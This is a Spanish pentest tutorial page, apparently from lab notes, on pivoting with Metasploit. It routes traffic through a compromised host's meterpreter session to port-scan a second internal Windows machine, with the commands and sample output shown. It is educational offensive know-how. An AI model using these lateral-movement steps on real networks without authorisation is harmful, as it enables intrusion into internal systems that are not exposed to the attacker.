---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Pivoting

Esta tecnica de `Pivoting` consiste en que no se centra unicamente en un puerto, si no que conseguimos redirigir todo el trafico de datos a la maquina victima que este a nivel local, pudiendo escanear todos los puertos y no solo uno, pudiendo explotarla de cualquier forma que queramos, como si estuviera expuesta a la red, pero estariamos `pivotando` a la maquina en si, para que podamos realizar todo esto.

Teniendo una `shell` con la maquina `WS02` desde `metasploit` con `meterpreter`, vamos a mandarla al `background` con `Ctrl+Z` y despues dandole a `y`, con esto dejaremos la sesion en segundo plano, para despues poder utilizarla mas adelante.

```
meterpreter > 
Background session 1? [y/N]  y
```

Ahora vamos a utilizar en `metasploit` un modulo que se llama `route`, esto lo que hace es enrutar todo el trafico de red que nosotros enviemos a la maquina victima que nosotros pongamos, por ejemplo pondremos la de `WS01`.

```shell
route add 192.168.5.208 255.255.255.0 1
```

Con el `1` le estamos indicando que utilice la sesion de meterpreter numero `1`, ya que si hacemos `sessions` podremos ver las sesiones en mi caso:

```
Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x86/windows  CORP\empleado2 @ WS02  192.168.5.205:7777 -> 192.168.5.209:63411 (192.168.5.209)
```

Seria la numero `1`, por eso pongo un `1`.

Info (`Comando route`):

```
[*] Route added
```

Lo que estamos haciendo es que ahora vamos a enrutar todo el trafico desde la sesion que tenemos de la maquina `WS02` a la `WS01`, por lo que cuando hagamos un escaneo de puertos o de cualquier otra cosa lo estaremos haciendo a la `WS01` por que se lo enviara la maquina `WS02` que tenemos comprometida.

Ahora utilizaremos el siguiente modulo:

```shell
use auxiliary/scanner/portscan/tcp
```

Ahora vamos a configurar un poco el modulo para realizar el escaneo de puertos, pero vamos a bajarle un poco los puertos que tiene por defecto y demas cosas.

```shell
set PORTS 100-150
set RHOSTS 192.168.5.208
run
```

En el `RHOSTS` ponemos la `IP` de la maquina que queremos escanear al cual le hemos echo el `route`.

Info:

```
[+] 192.168.5.208:        - 192.168.5.208:135 - TCP OPEN
[+] 192.168.5.208:        - 192.168.5.208:139 - TCP OPEN
[*] 192.168.5.208:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

El escaneo a nivel de `red` lo ha realizado la maquina `WS02` en vez de el `kali` ya que se esta enrutando el trafico de `red` desde el `kali` al `WS02` y este al `WS01`, por lo que en parte seria un escaneo invisible para nuestra maquina `kali`.

Con esto ya digo, podremos utilizar algun `exploit` o cualquier otra cosa de explotacion para la maquina `WS01` utilizando la maquina de salto `WS02` que lo hara en dicho nombre.
